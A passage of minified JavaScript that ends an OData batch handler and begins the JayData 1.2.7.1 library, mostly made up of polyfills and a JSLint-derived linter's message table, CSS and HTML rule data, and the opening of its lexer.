batch+=writeBatchPartDelimiter(batchBoundary,true);var contentTypeProperties=context.contentType.properties;contentTypeProperties.boundary=batchBoundary;return batch;};var writeServerBatchPart=function(part,context,nested){var changeSet=part.__changeRequests;var result;if(isArray(changeSet)){if(nested){throw{message:"Not Supported: change set nested in other change set"};}
var changeSetBoundary=createBoundary("changesetresponse_");result="Content-Type: "+batchMediaType+"; boundary="+changeSetBoundary+"\r\n";var i,len;for(i=0,len=changeSet.length;i<len;i++){result+=writeBatchPartDelimiter(changeSetBoundary,false)+
writeServerBatchPart(changeSet[i],context,true);}
result+=writeBatchPartDelimiter(changeSetBoundary,true);}else{result="Content-Type: application/http\r\nContent-Transfer-Encoding: binary\r\n\r\n";prepareResponse(part,partHandlerSelector(context,part),{metadata:context.metadata});result+=writeServerResponse(part);}
return result;};var writeServerResponse=function(response){var result="HTTP/1.1 "+response.statusCode+" "+response.statusName+"\r\n";for(var name in response.headers){if(response.headers[name]){result=result+name+": "+response.headers[name]+"\r\n";}}
result+="\r\n";if(response.body){result+=response.body;}
return result;};odata.batchServerHandler=handler(batchServerParser,batchServerSerializer,batchMediaType,MAX_DATA_SERVICE_VERSION);var defaultJsonHandler=function(handler,text,context){return text?window.JSON.parse(text):undefined;};odata.serverJsonHandler=handler(defaultJsonHandler,jsonSerializer,jsonAcceptTypes.join(","),MAX_DATA_SERVICE_VERSION);var atomReadHandler=handler(atomParser,textSerialize,atomAcceptTypes.join(","),MAX_DATA_SERVICE_VERSION);atomReadHandler.dataValidator=function(part){return typeof part.data==='string';};odata.batchServerHandler.partHandler=[odata.serverJsonHandler,atomReadHandler,odata.atomHandler,odata.defaultHandler];})(window);
// js/jaydata/jaydata.js

(function(global){if(typeof window==="undefined"){window=this;}
$data=window["$data"]||(window["$data"]=(function _data_handler(){if(this instanceof _data_handler){var type=_data_handler["implementation"].apply(this,arguments);return new type(arguments[1]);}else{return _data_handler["implementation"].apply(this,arguments)}}));})(this);if(typeof console==='undefined'){console={warn:function(){},error:function(){},log:function(){},dir:function(){},time:function(){},timeEnd:function(){}};}
if(!console.warn)console.warn=function(){};if(!console.error)console.error=function(){};(function($data){$data.__namespace=true;$data.version="JayData 1.2.7.1";$data.versionNumber="1.2.7.1";$data.root={};})($data);Guard={};Guard.requireValue=function(name,value){if(typeof value==='undefined'||value===null){Guard.raise(name+" requires a value other than undefined or null");}};Guard.requireType=function(name,value,typeOrTypes){var types=typeOrTypes instanceof Array?typeOrTypes:[typeOrTypes];return types.some(function(item){switch(typeof item){case"string":return typeof value===item;case"function":return value instanceof item;default:Guard.raise("Unknown type format : "+typeof item+" for: "+name);}});};Guard.raise=function(exception){if(typeof intellisense==='undefined'){if(exception instanceof Exception){console.error(exception.name+':',exception.message+'\n',exception);}else{console.error(exception);}
throw exception;}};Object.isNullOrUndefined=function(value){return value===undefined||value===null;};(function ObjectMethodsForPreHTML5Browsers(){if(!Object.getOwnPropertyNames){Object.getOwnPropertyNames=function(o){var names=[];for(var i in o){if(o.hasOwnProperty(i))names.push(i);}
return names;};}
if(!Object.create){Object.create=function(o){if(arguments.length>1){Guard.raise(new Error('Object.create implementation only accepts the first parameter.'));}
function F(){}
F.prototype=o;return new F();};}
if(!Object.keys){var hasOwnProperty=Object.prototype.hasOwnProperty,hasDontEnumBug=!({toString:null}).propertyIsEnumerable('toString'),dontEnums=['toString','toLocaleString','valueOf','hasOwnProperty','isPrototypeOf','propertyIsEnumerable','constructor'],dontEnumsLength=dontEnums.length;Object.keys=function(obj){if(typeof obj!=='object'&&typeof obj!=='function'||obj===null)Guard.raise(new TypeError('Object.keys called on non-object'));var result=[];for(var prop in obj){if(hasOwnProperty.call(obj,prop)){result.push(prop);}}
if(hasDontEnumBug){for(var i=0;i<dontEnumsLength;i++){if(hasOwnProperty.call(obj,dontEnums[i])){result.push(dontEnums[i]);}}}
return result;};}
if(!Object.defineProperty){Object.defineProperty=function(obj,propName,propDef){obj[propName]=propDef.value||{};};}
if(!Object.defineProperties){Object.defineProperties=function(obj,defines){for(var i in defines){if(defines.hasOwnProperty(i))
obj[i]=defines[i].value||{};}};}
if(!Array.prototype.forEach){Array.prototype.forEach=function(handler,thisArg){for(var i=0,l=this.length;i<l;i++){if(thisArg){handler.call(thisArg,this[i],i,this);}
else{handler(this[i],i,this);};};};};if(!Array.prototype.filter){Array.prototype.filter=function(handler,thisArg){var result=[];for(var i=0,l=this.length;i<l;i++){var r=thisArg?handler.call(thisArg,this[i],i,this):handler(this[i],i,this);if(r===true){result.push(this[i]);}}
return result;};}
if(!Array.prototype.map){Array.prototype.map=function(handler,thisArg){var result=[];for(var i=0,l=this.length;i<l;i++){var r=thisArg?handler.call(thisArg,this[i],i,this):handler(this[i],i,this);result.push(r);}
return result;};}
if(!Array.prototype.some){Array.prototype.some=function(handler,thisArg){for(var i=0,l=this.length;i<l;i++){var r=thisArg?handler.call(thisArg,this[i],i,this):handler(this[i],i,this);if(r){return true;}}
return false;};}
if(!Array.prototype.indexOf){Array.prototype.indexOf=function(item,from){for(var i=0,l=this.length;i<l;i++){if(this[i]===item){return i;};};return-1;};}
if(!String.prototype.trimLeft){String.prototype.trimLeft=function(){return this.replace(/^\s+/,"");}}
if(!String.prototype.trimRight){String.prototype.trimRight=function(){return this.replace(/\s+$/,"");}}})();JAYLINT=(function(){'use strict';var adsafe_id,adsafe_may,adsafe_top,adsafe_went,anonname,approved,bang={'<':true,'<=':true,'==':true,'===':true,'!==':true,'!=':true,'>':true,'>=':true,'+':true,'-':true,'*':true,'/':true,'%':true},banned={'arguments':true,callee:true,caller:true,constructor:true,'eval':true,prototype:true,stack:true,unwatch:true,valueOf:true,watch:true},begin,browser={clearInterval:false,clearTimeout:false,document:false,event:false,frames:false,history:false,Image:false,localStorage:false,location:false,name:false,navigator:false,Option:false,parent:false,screen:false,sessionStorage:false,setInterval:false,setTimeout:false,Storage:false,window:false,XMLHttpRequest:false},bundle={a_label:"'{a}' is a statement label.",a_not_allowed:"'{a}' is not allowed.",a_not_defined:"'{a}' is not defined.",a_scope:"'{a}' used out of scope.",adsafe:"ADsafe violation.",adsafe_a:"ADsafe violation: '{a}'.",adsafe_autocomplete:"ADsafe autocomplete violation.",adsafe_bad_id:"ADSAFE violation: bad id.",adsafe_div:"ADsafe violation: Wrap the widget in a div.",adsafe_fragment:"ADSAFE: Use the fragment option.",adsafe_go:"ADsafe violation: Misformed ADSAFE.go.",adsafe_html:"Currently, ADsafe does not operate on whole HTML "+"documents. It operates on <div> fragments and .js files.",adsafe_id:"ADsafe violation: id does not match.",adsafe_id_go:"ADsafe violation: Missing ADSAFE.id or ADSAFE.go.",adsafe_lib:"ADsafe lib violation.",adsafe_lib_second:"ADsafe: The second argument to lib must be a function.",adsafe_missing_id:"ADSAFE violation: missing ID_.",adsafe_name_a:"ADsafe name violation: '{a}'.",adsafe_placement:"ADsafe script placement violation.",adsafe_prefix_a:"ADsafe violation: An id must have a '{a}' prefix",adsafe_script:"ADsafe script violation.",adsafe_source:"ADsafe unapproved script source.",adsafe_subscript_a:"ADsafe subscript '{a}'.",adsafe_tag:"ADsafe violation: Disallowed tag '{a}'.",already_defined:"'{a}' is already defined.",and:"The '&&' subexpression should be wrapped in parens.",assign_exception:"Do not assign to the exception parameter.",assignment_function_expression:"Expected an assignment or "+"function call and instead saw an expression.",attribute_case_a:"Attribute '{a}' not all lower case.",avoid_a:"Avoid '{a}'.",bad_assignment:"Bad assignment.",bad_color_a:"Bad hex color '{a}'.",bad_constructor:"Bad constructor.",bad_entity:"Bad entity.",bad_html:"Bad HTML string",bad_id_a:"Bad id: '{a}'.",bad_in_a:"Bad for in variable '{a}'.",bad_invocation:"Bad invocation.",bad_name_a:"Bad name: '{a}'.",bad_new:"Do not use 'new' for side effects.",bad_number:"Bad number '{a}'.",bad_operand:"Bad operand.",bad_type:"Bad type.",bad_url:"Bad url string.",bad_wrap:"Do not wrap function literals in parens unless they "+"are to be immediately invoked.",combine_var:"Combine this with the previous 'var' statement.",conditional_assignment:"Expected a conditional expression and "+"instead saw an assignment.",confusing_a:"Confusing use of '{a}'.",confusing_regexp:"Confusing regular expression.",constructor_name_a:"A constructor name '{a}' should start with "+"an uppercase letter.",control_a:"Unexpected control character '{a}'.",css:"A css file should begin with @charset 'UTF-8';",dangling_a:"Unexpected dangling '_' in '{a}'.",dangerous_comment:"Dangerous comment.",deleted:"Only properties should be deleted.",duplicate_a:"Duplicate '{a}'.",empty_block:"Empty block.",empty_case:"Empty case.",empty_class:"Empty class.",es5:"This is an ES5 feature.",evil:"eval is evil.",expected_a:"Expected '{a}'.",expected_a_b:"Expected '{a}' and instead saw '{b}'.",expected_a_b_from_c_d:"Expected '{a}' to match '{b}' from line "+"{c} and instead saw '{d}'.",expected_at_a:"Expected an at-rule, and instead saw @{a}.",expected_a_at_b_c:"Expected '{a}' at column {b}, not column {c}.",expected_attribute_a:"Expected an attribute, and instead saw [{a}].",expected_attribute_value_a:"Expected an attribute value and "+"instead saw '{a}'.",expected_class_a:"Expected a class, and instead saw .{a}.",expected_fraction_a:"Expected a number between 0 and 1 and "+"instead saw '{a}'",expected_id_a:"Expected an id, and instead saw #{a}.",expected_identifier_a:"Expected an identifier and instead saw '{a}'.",expected_identifier_a_reserved:"Expected an identifier and "+"instead saw '{a}' (a reserved word).",expected_linear_a:"Expected a linear unit and instead saw '{a}'.",expected_lang_a:"Expected a lang code, and instead saw :{a}.",expected_media_a:"Expected a CSS media type, and instead saw '{a}'.",expected_name_a:"Expected a name and instead saw '{a}'.",expected_nonstandard_style_attribute:"Expected a non-standard "+"style attribute and instead saw '{a}'.",expected_number_a:"Expected a number and instead saw '{a}'.",expected_operator_a:"Expected an operator and instead saw '{a}'.",expected_percent_a:"Expected a percentage and instead saw '{a}'",expected_positive_a:"Expected a positive number and instead saw '{a}'",expected_pseudo_a:"Expected a pseudo, and instead saw :{a}.",expected_selector_a:"Expected a CSS selector, and instead saw {a}.",expected_small_a:"Expected a small number and instead saw '{a}'",expected_space_a_b:"Expected exactly one space between '{a}' and '{b}'.",expected_string_a:"Expected a string and instead saw {a}.",expected_style_attribute:"Excepted a style attribute, and instead saw '{a}'.",expected_style_pattern:"Expected a style pattern, and instead saw '{a}'.",expected_tagname_a:"Expected a tagName, and instead saw {a}.",for_if:"The body of a for in should be wrapped in an if "+"statement to filter unwanted properties from the prototype.",function_block:"Function statements should not be placed in blocks. "+"Use a function expression or move the statement to the top of "+"the outer function.",function_eval:"The Function constructor is eval.",function_loop:"Don't make functions within a loop.",function_statement:"Function statements are not invocable. "+"Wrap the whole function invocation in parens.",function_strict:"Use the function form of 'use strict'.",html_confusion_a:"HTML confusion in regular expression '<{a}'.",html_handlers:"Avoid HTML event handlers.",identifier_function:"Expected an identifier in an assignment "+"and instead saw a function invocation.",implied_evil:"Implied eval is evil. Pass a function instead of a string.",infix_in:"Unexpected 'in'. Compare with undefined, or use the "+"hasOwnProperty method instead.",insecure_a:"Insecure '{a}'.",isNaN:"Use the isNaN function to compare with NaN.",label_a_b:"Label '{a}' on '{b}' statement.",lang:"lang is deprecated.",leading_decimal_a:"A leading decimal point can be confused with a dot: '.{a}'.",missing_a:"Missing '{a}'.",missing_a_after_b:"Missing '{a}' after '{b}'.",missing_option:"Missing option value.",missing_property:"Missing property name.",missing_space_a_b:"Missing space between '{a}' and '{b}'.",missing_url:"Missing url.",missing_use_strict:"Missing 'use strict' statement.",mixed:"Mixed spaces and tabs.",move_invocation:"Move the invocation into the parens that "+"contain the function.",move_var:"Move 'var' declarations to the top of the function.",name_function:"Missing name in function statement.",nested_comment:"Nested comment.",not:"Nested not.",not_a_constructor:"Do not use {a} as a constructor.",not_a_defined:"'{a}' has not been fully defined yet.",not_a_function:"'{a}' is not a function.",not_a_label:"'{a}' is not a label.",not_a_scope:"'{a}' is out of scope.",not_greater:"'{a}' should not be greater than '{b}'.",parameter_a_get_b:"Unexpected parameter '{a}' in get {b} function.",parameter_set_a:"Expected parameter (value) in set {a} function.",radix:"Missing radix parameter.",read_only:"Read only.",redefinition_a:"Redefinition of '{a}'.",reserved_a:"Reserved name '{a}'.",scanned_a_b:"{a} ({b}% scanned).",slash_equal:"A regular expression literal can be confused with '/='.",statement_block:"Expected to see a statement and instead saw a block.",stopping:"Stopping. ",strange_loop:"Strange loop.",strict:"Strict violation.",subscript:"['{a}'] is better written in dot notation.",tag_a_in_b:"A '<{a}>' must be within '<{b}>'.",too_long:"Line too long.",too_many:"Too many errors.",trailing_decimal_a:"A trailing decimal point can be confused "+"with a dot: '.{a}'.",type:"type is unnecessary.",type_inconsistency_a_b:"Type inconsistency: {a} and {b}.",unclosed:"Unclosed string.",unclosed_comment:"Unclosed comment.",unclosed_regexp:"Unclosed regular expression.",unescaped_a:"Unescaped '{a}'.",unexpected_a:"Unexpected '{a}'.",unexpected_char_a_b:"Unexpected character '{a}' in {b}.",unexpected_comment:"Unexpected comment.",unexpected_property_a:"Unexpected /*property*/ '{a}'.",unexpected_space_a_b:"Unexpected space between '{a}' and '{b}'.",unnecessary_initialize:"It is not necessary to initialize '{a}' "+"to 'undefined'.",unnecessary_use:"Unnecessary 'use strict'.",unreachable_a_b:"Unreachable '{a}' after '{b}'.",unrecognized_style_attribute_a:"Unrecognized style attribute '{a}'.",unrecognized_tag_a:"Unrecognized tag '<{a}>'.",unsafe:"Unsafe character.",url:"JavaScript URL.",use_array:"Use the array literal notation [].",use_braces:"Spaces are hard to count. Use {{a}}.",use_charAt:"Use the charAt method.",use_object:"Use the object literal notation {}.",use_or:"Use the || operator.",use_param:"Use a named parameter.",used_before_a:"'{a}' was used before it was defined.",var_a_not:"Variable {a} was not declared correctly.",weird_assignment:"Weird assignment.",weird_condition:"Weird condition.",weird_new:"Weird construction. Delete 'new'.",weird_program:"Weird program.",weird_relation:"Weird relation.",weird_ternary:"Weird ternary.",wrap_immediate:"Wrap an immediate function invocation in parentheses "+"to assist the reader in understanding that the expression "+"is the result of a function, and not the function itself.",wrap_regexp:"Wrap the /regexp/ literal in parens to "+"disambiguate the slash operator.",write_is_wrong:"document.write can be a form of eval."},comments_off,css_attribute_data,css_any,css_colorData={"aliceblue":true,"antiquewhite":true,"aqua":true,"aquamarine":true,"azure":true,"beige":true,"bisque":true,"black":true,"blanchedalmond":true,"blue":true,"blueviolet":true,"brown":true,"burlywood":true,"cadetblue":true,"chartreuse":true,"chocolate":true,"coral":true,"cornflowerblue":true,"cornsilk":true,"crimson":true,"cyan":true,"darkblue":true,"darkcyan":true,"darkgoldenrod":true,"darkgray":true,"darkgreen":true,"darkkhaki":true,"darkmagenta":true,"darkolivegreen":true,"darkorange":true,"darkorchid":true,"darkred":true,"darksalmon":true,"darkseagreen":true,"darkslateblue":true,"darkslategray":true,"darkturquoise":true,"darkviolet":true,"deeppink":true,"deepskyblue":true,"dimgray":true,"dodgerblue":true,"firebrick":true,"floralwhite":true,"forestgreen":true,"fuchsia":true,"gainsboro":true,"ghostwhite":true,"gold":true,"goldenrod":true,"gray":true,"green":true,"greenyellow":true,"honeydew":true,"hotpink":true,"indianred":true,"indigo":true,"ivory":true,"khaki":true,"lavender":true,"lavenderblush":true,"lawngreen":true,"lemonchiffon":true,"lightblue":true,"lightcoral":true,"lightcyan":true,"lightgoldenrodyellow":true,"lightgreen":true,"lightpink":true,"lightsalmon":true,"lightseagreen":true,"lightskyblue":true,"lightslategray":true,"lightsteelblue":true,"lightyellow":true,"lime":true,"limegreen":true,"linen":true,"magenta":true,"maroon":true,"mediumaquamarine":true,"mediumblue":true,"mediumorchid":true,"mediumpurple":true,"mediumseagreen":true,"mediumslateblue":true,"mediumspringgreen":true,"mediumturquoise":true,"mediumvioletred":true,"midnightblue":true,"mintcream":true,"mistyrose":true,"moccasin":true,"navajowhite":true,"navy":true,"oldlace":true,"olive":true,"olivedrab":true,"orange":true,"orangered":true,"orchid":true,"palegoldenrod":true,"palegreen":true,"paleturquoise":true,"palevioletred":true,"papayawhip":true,"peachpuff":true,"peru":true,"pink":true,"plum":true,"powderblue":true,"purple":true,"red":true,"rosybrown":true,"royalblue":true,"saddlebrown":true,"salmon":true,"sandybrown":true,"seagreen":true,"seashell":true,"sienna":true,"silver":true,"skyblue":true,"slateblue":true,"slategray":true,"snow":true,"springgreen":true,"steelblue":true,"tan":true,"teal":true,"thistle":true,"tomato":true,"turquoise":true,"violet":true,"wheat":true,"white":true,"whitesmoke":true,"yellow":true,"yellowgreen":true,"activeborder":true,"activecaption":true,"appworkspace":true,"background":true,"buttonface":true,"buttonhighlight":true,"buttonshadow":true,"buttontext":true,"captiontext":true,"graytext":true,"highlight":true,"highlighttext":true,"inactiveborder":true,"inactivecaption":true,"inactivecaptiontext":true,"infobackground":true,"infotext":true,"menu":true,"menutext":true,"scrollbar":true,"threeddarkshadow":true,"threedface":true,"threedhighlight":true,"threedlightshadow":true,"threedshadow":true,"window":true,"windowframe":true,"windowtext":true},css_border_style,css_break,css_lengthData={'%':true,'cm':true,'em':true,'ex':true,'in':true,'mm':true,'pc':true,'pt':true,'px':true},css_media,css_overflow,descapes={'b':'\b','t':'\t','n':'\n','f':'\f','r':'\r','"':'"','/':'/','\\':'\\'},devel={alert:false,confirm:false,console:false,Debug:false,opera:false,prompt:false},escapes={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','\'':'\\\'','"':'\\"','/':'\\/','\\':'\\\\'},funct,functionicity=['closure','exception','global','label','outer','undef','unused','var'],functions,global_funct,global_scope,html_tag={a:{},abbr:{},acronym:{},address:{},applet:{},area:{empty:true,parent:' map '},article:{},aside:{},audio:{},b:{},base:{empty:true,parent:' head '},bdo:{},big:{},blockquote:{},body:{parent:' html noframes '},br:{empty:true},button:{},canvas:{parent:' body p div th td '},caption:{parent:' table '},center:{},cite:{},code:{},col:{empty:true,parent:' table colgroup '},colgroup:{parent:' table '},command:{parent:' menu '},datalist:{},dd:{parent:' dl '},del:{},details:{},dialog:{},dfn:{},dir:{},div:{},dl:{},dt:{parent:' dl '},em:{},embed:{},fieldset:{},figure:{},font:{},footer:{},form:{},frame:{empty:true,parent:' frameset '},frameset:{parent:' html frameset '},h1:{},h2:{},h3:{},h4:{},h5:{},h6:{},head:{parent:' html '},header:{},hgroup:{},hr:{empty:true},'hta:application':{empty:true,parent:' head '},html:{parent:'*'},i:{},iframe:{},img:{empty:true},input:{empty:true},ins:{},kbd:{},keygen:{},label:{},legend:{parent:' details fieldset figure '},li:{parent:' dir menu ol ul '},link:{empty:true,parent:' head '},map:{},mark:{},menu:{},meta:{empty:true,parent:' head noframes noscript '},meter:{},nav:{},noframes:{parent:' html body '},noscript:{parent:' body head noframes '},object:{},ol:{},optgroup:{parent:' select '},option:{parent:' optgroup select '},output:{},p:{},param:{empty:true,parent:' applet object '},pre:{},progress:{},q:{},rp:{},rt:{},ruby:{},samp:{},script:{empty:true,parent:' body div frame head iframe p pre span '},section:{},select:{},small:{},span:{},source:{},strong:{},style:{parent:' head ',empty:true},sub:{},sup:{},table:{},tbody:{parent:' table '},td:{parent:' tr '},textarea:{},tfoot:{parent:' table '},th:{parent:' tr '},thead:{parent:' table '},time:{},title:{parent:' head '},tr:{parent:' table tbody thead tfoot '},tt:{},u:{},ul:{},'var':{},video:{}},ids,in_block,indent,itself,json_mode,lex,lines,lookahead,member,node={Buffer:false,clearInterval:false,clearTimeout:false,console:false,exports:false,global:false,module:false,process:false,querystring:false,require:false,setInterval:false,setTimeout:false,__dirname:false,__filename:false},node_js,numbery={indexOf:true,lastIndexOf:true,search:true},next_token,older_token,option,predefined,prereg,prev_token,properties,regexp_flag={g:true,i:true,m:true},rhino={defineClass:false,deserialize:false,gc:false,help:false,load:false,loadClass:false,print:false,quit:false,readFile:false,readUrl:false,runCommand:false,seal:false,serialize:false,spawn:false,sync:false,toint32:false,version:false},scope,semicolon_coda={';':true,'"':true,'\'':true,')':true},src,stack,standard={Array:false,Boolean:false,Date:false,decodeURI:false,decodeURIComponent:false,encodeURI:false,encodeURIComponent:false,Error:false,'eval':false,EvalError:false,Function:false,isFinite:false,isNaN:false,JSON:false,Math:false,Number:false,Object:false,parseInt:false,parseFloat:false,RangeError:false,ReferenceError:false,RegExp:false,String:false,SyntaxError:false,TypeError:false,URIError:false},standard_property={E:true,LN2:true,LN10:true,LOG2E:true,LOG10E:true,MAX_VALUE:true,MIN_VALUE:true,NEGATIVE_INFINITY:true,PI:true,POSITIVE_INFINITY:true,SQRT1_2:true,SQRT2:true},strict_mode,syntax={},tab,token,urls,var_mode,warnings,widget={alert:true,animator:true,appleScript:true,beep:true,bytesToUIString:true,Canvas:true,chooseColor:true,chooseFile:true,chooseFolder:true,closeWidget:true,COM:true,convertPathToHFS:true,convertPathToPlatform:true,CustomAnimation:true,escape:true,FadeAnimation:true,filesystem:true,Flash:true,focusWidget:true,form:true,FormField:true,Frame:true,HotKey:true,Image:true,include:true,isApplicationRunning:true,iTunes:true,konfabulatorVersion:true,log:true,md5:true,MenuItem:true,MoveAnimation:true,openURL:true,play:true,Point:true,popupMenu:true,preferenceGroups:true,preferences:true,print:true,prompt:true,random:true,Rectangle:true,reloadWidget:true,ResizeAnimation:true,resolvePath:true,resumeUpdates:true,RotateAnimation:true,runCommand:true,runCommandInBg:true,saveAs:true,savePreferences:true,screen:true,ScrollBar:true,showWidgetPreferences:true,sleep:true,speak:true,Style:true,suppressUpdates:true,system:true,tellWidget:true,Text:true,TextArea:true,Timer:true,unescape:true,updateNow:true,URL:true,Web:true,widget:true,Window:true,XMLDOM:true,XMLHttpRequest:true,yahooCheckLogin:true,yahooLogin:true,yahooLogout:true},windows={ActiveXObject:false,CScript:false,Debug:false,Enumerator:false,System:false,VBArray:false,WScript:false},xmode,xquote,ax=/@cc|<\/?|script|\]\s*\]|<\s*!|&lt/i,crx=/\r/g,crlfx=/\r\n/g,cx=/[\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/,dx=/[\[\]\/\\"'*<>.&:(){}+=#]/,hx=/^\s*(['"=>\/&#]|<(?:\/|\!(?:--)?)?|[a-zA-Z][a-zA-Z0-9_\-:]*|[0-9]+|--)/,ix=/^([a-zA-Z_$][a-zA-Z0-9_$]*)$/,jx=/^(?:javascript|jscript|ecmascript|vbscript|mocha|livescript)\s*:/i,lx=/\*\/|\/\*/,nx=/[\u0000-\u001f'\\\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,ox=/[>&]|<[\/!]?|--/,qx=/[^a-zA-Z0-9+\-_\/ ]/,sx=/^\s*([{:#%.=,>+\[\]@()"';]|\*=?|\$=|\|=|\^=|~=|[a-zA-Z_][a-zA-Z0-9_\-]*|[0-9]+|<\/|\/\*)/,ssx=/^\s*([@#!"'};:\-%.=,+\[\]()*_]|[a-zA-Z][a-zA-Z0-9._\-]*|\/\*?|\d+(?:\.\d+)?|<\/)/,tx=/^\s*([(){}\[.,:;'"~\?\]#@]|==?=?|\/(\*(jslint|properties|property|members?|globals?)?|=|\/)?|\*[\/=]?|\+(?:=|\++)?|-(?:=|-+)?|%=?|&[&=]?|\|[|=]?|>>?>?=?|<([\/=!]|\!(\[|--)?|<=?)?|\^=?|\!=?=?|[a-zA-Z_$][a-zA-Z0-9_$]*|[0-9]+([xX][0-9a-fA-F]+|\.[0-9]*)?([eE][+\-]?[0-9]+)?)/,ux=/&|\+|\u00AD|\.\.|\/\*|%[^;]|base64|url|expression|data|mailto/i,rx={outer:hx,html:hx,style:sx,styleproperty:ssx};function return_this(){return this;}
function F(){}
if(typeof Array.prototype.filter!=='function'){Array.prototype.filter=function(f){var i,length=this.length,result=[],value;for(i=0;i<length;i+=1){try{value=this[i];if(f(value)){result.push(value);}}catch(ignore){}}
return result;};}
if(typeof Array.prototype.forEach!=='function'){Array.prototype.forEach=function(f){var i,length=this.length,result=[];for(i=0;i<length;i+=1){try{f(this[i]);}catch(ignore){}}
return result;};}
if(typeof Array.isArray!=='function'){Array.isArray=function(o){return Object.prototype.toString.apply(o)==='[object Array]';};}
if(!Object.prototype.hasOwnProperty.call(Object,'create')){Object.create=function(o){F.prototype=o;return new F();};}
if(typeof Object.keys!=='function'){Object.keys=function(o){var array=[],key;for(key in o){if(Object.prototype.hasOwnProperty.call(o,key)){array.push(key);}}
return array;};}
if(typeof String.prototype.entityify!=='function'){String.prototype.entityify=function(){return this.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');};}
if(typeof String.prototype.isAlpha!=='function'){String.prototype.isAlpha=function(){return(this>='a'&&this<='z\uffff')||(this>='A'&&this<='Z\uffff');};}
if(typeof String.prototype.isDigit!=='function'){String.prototype.isDigit=function(){return(this>='0'&&this<='9');};}
if(typeof String.prototype.supplant!=='function'){String.prototype.supplant=function(o){return this.replace(/\{([^{}]*)\}/g,function(a,b){var replacement=o[b];return typeof replacement==='string'||typeof replacement==='number'?replacement:a;});};}
function sanitize(a){return escapes[a]||'\\u'+('0000'+a.charCodeAt().toString(16)).slice(-4);}
function add_to_predefined(group){Object.keys(group).forEach(function(name){predefined[name]=group[name];});}
function assume(){if(!option.safe){if(option.rhino){add_to_predefined(rhino);option.rhino=false;}
if(option.devel){add_to_predefined(devel);option.devel=false;}
if(option.browser){add_to_predefined(browser);option.browser=false;}
if(option.windows){add_to_predefined(windows);option.windows=false;}
if(option.node){add_to_predefined(node);option.node=false;node_js=true;}
if(option.widget){add_to_predefined(widget);option.widget=false;}}}
function quit(message,line,character){throw{name:'JSLintError',line:line,character:character,message:bundle.scanned_a_b.supplant({a:message,b:Math.floor((line/lines.length)*100)})};}
function warn(message,offender,a,b,c,d){var character,line,warning;offender=offender||next_token;line=offender.line||0;character=offender.from||0;warning={id:'(error)',raw:bundle[message]||message,evidence:lines[line-1]||'',line:line,character:character,a:a||offender.value,b:b,c:c,d:d};warning.reason=warning.raw.supplant(warning);JAYLINT.errors.push(warning);if(option.passfail){quit(bundle.stopping,line,character);}
warnings+=1;if(warnings>=option.maxerr){quit(bundle.too_many,line,character);}
return warning;}
function warn_at(message,line,character,a,b,c,d){return warn(message,{line:line,from:character},a,b,c,d);}
function stop(message,offender,a,b,c,d){var warning=warn(message,offender,a,b,c,d);quit(bundle.stopping,warning.line,warning.character);}
function stop_at(message,line,character,a,b,c,d){return stop(message,{line:line,from:character},a,b,c,d);}
function expected_at(at){if(!option.white&&next_token.from!==at){warn('expected_a_at_b_c',next_token,next_token.value,at,next_token.from);}}
function aint(it,name,expected){if(it[name]!==expected){warn('expected_a_b',it,expected,it[name]);return true;}else{return false;}}
lex=(function lex(){var character,c,from,length,line,pos,source_row;function collect_comment(comment,quote,line,at){var comment_object={comment:comment,quote:quote,at:at,line:line};if(comments_off||src||(xmode&&xmode!=='script'&&xmode!=='style'&&xmode!=='styleproperty')){warn_at('unexpected_comment',line,character);}else if(xmode==='script'&&(/<\//i).test(source_row)){warn_at('unexpected_a',line,character,'<\/');}else if(option.safe&&ax.test(comment)){warn_at('dangerous_comment',line,at);}
if(older_token.comments){older_token.comments.push(comment_object);}else{older_token.comments=[comment_object];}
JAYLINT.comments.push(comment_object);}
function next_line(){var at;if(line>=lines.length){return false;}
character=1;source_row=lines[line];line+=1;at=source_row.search(/ \t/);if(at>=0){warn_at('mixed',line,at+1);}
source_row=source_row.replace(/\t/g,tab);at=source_row.search(cx);if(at>=0){warn_at('unsafe',line,at);}
if(option.maxlen&&option.maxlen<source_row.length){warn_at('too_long',line,source_row.length);}
return true;}
function it(type,value,quote){var id,the_token;if(type==='(string)'||type==='(range)'){if(jx.test(value)){warn_at('url',line,from);}}
the_token=Object.create(syntax[(type==='(punctuator)'||(type==='(identifier)'&&Object.prototype.hasOwnProperty.call(syntax,value))?value:type)]||syntax['(error)']);if(type==='(identifier)'){the_token.identifier=true;if(value==='__iterator__'||value==='__proto__'){stop_at('reserved_a',line,from,value);}else if(!option.nomen&&(value.charAt(0)==='_'||value.charAt(value.length-1)==='_')){warn_at('dangling_a',line,from,value);}}
if(value!==undefined){the_token.value=value;}
if(quote){the_token.quote=quote;}
the_token.line=line;the_token.from=from;the_token.thru=character;the_token.prev=older_token;id=the_token.id;prereg=id&&(('(,=:[!&|?{};'.indexOf(id.charAt(id.length-1))>=0)||id==='return');older_token.next=the_token;older_token=the_token;return the_token;}
function match(x){var exec=x.exec(source_row),first;if(exec){length=exec[0].length;first=exec[1];c=first.charAt(0);source_row=source_row.slice(length);from=character+length-first.length;character+=length;return first;}}
function string(x){var c,j,r='';function hex(n){var i=parseInt(source_row.substr(j+1,n),16);j+=n;if(i>=32&&i<=126&&i!==34&&i!==92&&i!==39){warn_at('unexpected_a',line,character,'\\');}
character+=n;c=String.fromCharCode(i);}
if(json_mode&&x!=='"'){warn_at('expected_a',line,character,'"');}
if(xquote===x||(xmode==='scriptstring'&&!xquote)){return it('(punctuator)',x);}
j=0;for(;;){while(j>=source_row.length){j=0;if(xmode!=='html'||!next_line()){stop_at('unclosed',line,from);}}
c=source_row.charAt(j);if(c===x){character+=1;source_row=source_row.slice(j+1);return it('(string)',r,x);}
if(c<' '){if(c==='\n'||c==='\r'){break;}
